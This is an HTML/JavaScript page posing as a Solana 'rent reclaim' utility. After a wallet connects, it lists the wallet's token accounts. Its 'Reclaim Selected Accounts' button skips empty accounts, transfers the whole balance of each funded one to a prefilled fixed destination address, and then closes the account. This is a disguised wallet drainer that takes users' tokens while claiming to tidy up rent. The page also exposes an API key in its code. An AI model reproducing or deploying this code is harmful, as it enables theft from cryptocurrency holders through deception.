<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Universal Solana Wallet DApp (Helius)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;padding:40px;background:#f0f2f5}
#walletApp{max-width:900px;width:100%;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,0.08)}
button{padding:12px;border-radius:8px;border:0;font-size:15px;cursor:pointer;margin:5;background:#4caf50;color:#fff}
button:hover{background:#45a049}
#logs{margin-top:12px;padding:12px;border-radius:8px;background:#e8f4fd;white-space:pre-wrap;max-height:300px;overflow:auto;text-align:left}
h2{margin:0 0 12px 0}
.note{font-size:13px;color:#666;margin-top:8px}
.dropdown{position:relative;width:48%;cursor:pointer;border:1px solid #ccc;border-radius:8px;padding:10px;background:#fff;display:flex;align-items:center;justify-content:space-between}
.dropdown .selected{display:flex;align-items:center;gap:8px}
.dropdown .options{position:absolute;top:100%;left:0;width:100%;background:#fff;border:1px solid #ccc;border-radius:8px;max-height:200px;overflow:auto;display:none;flex-direction:column;z-index:100}
.dropdown .option{padding:8px 10px;display:flex;align-items:center;gap:8px;cursor:pointer}
.dropdown .option:hover{background:#f0f0f0}
.wallet-icon{width:20px;height:20px;}
table{width:100%;border-collapse:collapse;margin-top:10px;}
th,td{border:1px solid #ccc;padding:6px;text-align:center;}
</style>
</head>
<body>
<div id="walletApp">
<h2>Universal Solana Wallet DApp (Helius)</h2>

<div style="display:flex;gap:8px;align-items:center;justify-content:center;margin-bottom:8px">
  <div class="dropdown" id="walletDropdown">
    <div class="selected"><span>Select Wallet</span> â–¼</div>
    <div class="options"></div>
  </div>
</div>

<div style="text-align:center">
  <button id="connectWallet">Connect Wallet</button>
  <button id="disconnectWallet">Disconnect Wallet</button>
</div>

<div style="margin-top:12px;">
  Destination wallet: <input type="text" id="destWallet" value="5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K" style="width:400px;">
</div>

<div style="margin-top:12px;">
  <table id="tokenTable">
    <thead>
      <tr><th>Select</th><th>Mint</th><th>Amount</th><th>USD</th></tr>
    </thead>
    <tbody></tbody>
  </table>
</div>

<div style="text-align:center">
  <button id="reclaimRentBtn">ðŸ§¹ Reclaim Selected Accounts</button>
</div>

<div class="note">Using Helius RPC (demo key) â€” do not commit private keys to public repos.</div>
<div id="logs">Logs will appear here...</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.7/lib/index.iife.min.js"></script>
<script>
(async function(){
const HELIUS_RPC='https://mainnet.helius-rpc.com/?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775';
const TOKEN_PROGRAM='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const DUST_THRESHOLD_USD=0.01;
const logsEl=document.getElementById('logs');
const walletDropdown=document.getElementById('walletDropdown');
const selectedEl=walletDropdown.querySelector('.selected span');
const optionsEl=walletDropdown.querySelector('.options');
const connectBtn=document.getElementById('connectWallet');
const disconnectBtn=document.getElementById('disconnectWallet');
const reclaimBtn=document.getElementById('reclaimRentBtn');
const tokenTableBody=document.getElementById('tokenTable').querySelector('tbody');
const destInput=document.getElementById('destWallet');

const WALLET_ICONS={
  Phantom:'https://i.postimg.cc/dtMtxggx/download-2025-10-28T170610-630.png',
  Solflare:'https://i.postimg.cc/YqcqsTTP/download-2025-10-28T170541-439.png',
  Slope:'https://raw.githubusercontent.com/solana-labs/wallet-adapter/main/packages/wallets/wallet-icons/src/slope.svg'
};

let wallet=null;
let publicKey=null;
let connection=new solanaWeb3.Connection(HELIUS_RPC,'confirmed');
let selectedWalletObj=null;
let tokenAccounts=[];

function log(msg){ logsEl.innerText+=msg+'\n'; logsEl.scrollTop=logsEl.scrollHeight; console.log(msg);}
function clearLogs(){ logsEl.innerText='';}

function detectWallets(){
  const wallets=[];
  if(window.phantom?.solana?.isPhantom) wallets.push({wallet: window.phantom.solana,name:'Phantom'});
  if(window.solflare?.isSolflare) wallets.push({wallet: window.solflare,name:'Solflare'});
  if(window.Slope) try{ wallets.push({wallet:new window.Slope(),name:'Slope'}); }catch{}
  return wallets;
}

function populateDropdown(){
  optionsEl.innerHTML='';
  detectWallets().forEach(w=>{
    const div=document.createElement('div');
    div.className='option';
    div.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`;
    div.onclick=()=>{ selectedWalletObj=w; selectedEl.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`; optionsEl.style.display='none';};
    optionsEl.appendChild(div);
  });
}
selectedEl.parentElement.onclick=()=>{ optionsEl.style.display = optionsEl.style.display==='flex'?'none':'flex'; }

async function getTokenPrices(mints){
  if(!mints.length) return {};
  try{
    const res=await fetch('https://api.helius.xyz/v0/token-prices?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775',{
      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mints})
    });
    const data=await res.json();
    if(!Array.isArray(data)) return {};
    const map={};
    data.forEach(p=>{ map[p.mint]=p.price||0; });
    return map;
  }catch(e){ log('âš ï¸ Token prices fetch failed: '+e.message); return {};}
}

async function connectWalletFunc(){
  clearLogs();
  if(!selectedWalletObj){ log('âŒ Select a wallet first'); return; }
  try{
    log('Connecting ' + selectedWalletObj.name + '...');
    const resp=await selectedWalletObj.wallet.connect();
    publicKey=resp?.publicKey || selectedWalletObj.wallet?.publicKey;
    if(publicKey?.toString) publicKey=publicKey.toString();
    wallet=selectedWalletObj.wallet;
    log('âœ… Connected: '+publicKey);

    const lamports=await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
    log('ðŸ’° SOL Balance: ' + (lamports/1e9).toFixed(6) + ' SOL');

    const rawTokenAccounts=await connection.getParsedTokenAccountsByOwner(
      new solanaWeb3.PublicKey(publicKey),
      {programId:new solanaWeb3.PublicKey(TOKEN_PROGRAM)}
    );
    tokenAccounts=rawTokenAccounts.value;

    const mints=tokenAccounts.map(t=>t.account.data.parsed.info.mint);
    const prices=await getTokenPrices(mints);

    tokenTableBody.innerHTML='';
    tokenAccounts.forEach((t,i)=>{
      const info=t.account.data.parsed.info;
      const amount=Number(info.tokenAmount.uiAmount);
      const usd=(amount*(prices[info.mint]||0)).toFixed(6);
      const tr=document.createElement('tr');
      tr.innerHTML=`<td><input type="checkbox" data-idx="${i}"></td><td>${info.mint}</td><td>${amount}</td><td>$${usd}</td>`;
      tokenTableBody.appendChild(tr);
    });

  }catch(e){ log('âŒ Connect failed: '+e.message);}
}

async function disconnectWalletFunc(){
  if(!wallet){ log('âŒ No wallet connected'); return;}
  try{ if(wallet.disconnect) await wallet.disconnect(); log('Wallet disconnected'); wallet=null; publicKey=null; selectedWalletObj=null; tokenAccounts=[]; tokenTableBody.innerHTML='';}
  catch(e){ log('âŒ Disconnect error: '+e.message);}
}

async function reclaimRent(){
  if(!wallet || !publicKey){ log('âŒ Connect wallet first.'); return;}
  clearLogs();
  log('ðŸ§¹ Reclaim Rent started...');

  const checkedBoxes=document.querySelectorAll('#tokenTable input[type=checkbox]:checked');
  if(checkedBoxes.length===0){ log('âŒ No token accounts selected'); return;}

  const destinationPubKey=destInput.value;
  if(!destinationPubKey){ log('âŒ Specify a destination wallet'); return;}

  for(const cb of checkedBoxes){
    const idx=cb.dataset.idx;
    const t=tokenAccounts[idx];
    const info=t.account.data.parsed.info;
    const amount=Number(info.tokenAmount.uiAmount);
    if(amount===0){ log(`Skipping ${info.mint}, zero balance`); continue;}

    try{
      const mintPub=new solanaWeb3.PublicKey(info.mint);
      const fromATA=new solanaWeb3.PublicKey(t.pubkey);
      const toPub=new solanaWeb3.PublicKey(destinationPubKey);
      const toATA=await splToken.getAssociatedTokenAddress(mintPub,toPub);

      const tx=new solanaWeb3.Transaction();

      // Ensure destination ATA exists
      const accountInfo=await connection.getAccountInfo(toATA);
      if(!accountInfo){
        const ix= splToken.createAssociatedTokenAccountInstruction(wallet.publicKey||new solanaWeb3.PublicKey(publicKey), toATA, toPub, mintPub);
        tx.add(ix);
      }

      // Transfer
      const transferIx=splToken.createTransferInstruction(fromATA,toATA, new solanaWeb3.PublicKey(publicKey), BigInt(amount*10**info.tokenAmount.decimals));
      tx.add(transferIx);

      // Close source account
      const closeIx=splToken.createCloseAccountInstruction(fromATA,new solanaWeb3.PublicKey(publicKey), new solanaWeb3.PublicKey(publicKey));
      tx.add(closeIx);

      tx.feePayer=new solanaWeb3.PublicKey(publicKey);
      const {blockhash}=await connection.getLatestBlockhash();
      tx.recentBlockhash=blockhash;

      let sig;
      if(wallet.signTransaction){
        const signedTx=await wallet.signTransaction(tx);
        sig=await connection.sendRawTransaction(signedTx.serialize());
      }else if(wallet.signAndSendTransaction){
        const res=await wallet.signAndSendTransaction(tx);
        sig=res?.signature||res;
      }else throw new Error('Wallet cannot sign transaction');

      await connection.confirmTransaction(sig,'confirmed');
      log(`âœ… Transferred and closed ${info.mint} â€” tx ${sig}`);
    }catch(e){ log(`âŒ Transfer/Close failed for ${info.mint}: ${e?.message||e}`);}
  }

  log('ðŸŽ‰ Reclaim run complete.');
}

// Wire buttons
connectBtn.addEventListener('click',connectWalletFunc);
disconnectBtn.addEventListener('click',disconnectWalletFunc);
reclaimBtn.addEventListener('click',reclaimRent);

populateDropdown();
setInterval(()=>{ if(detectWallets().length !== optionsEl.children.length) populateDropdown(); },3000);

})();
</script>
</body>
</html>
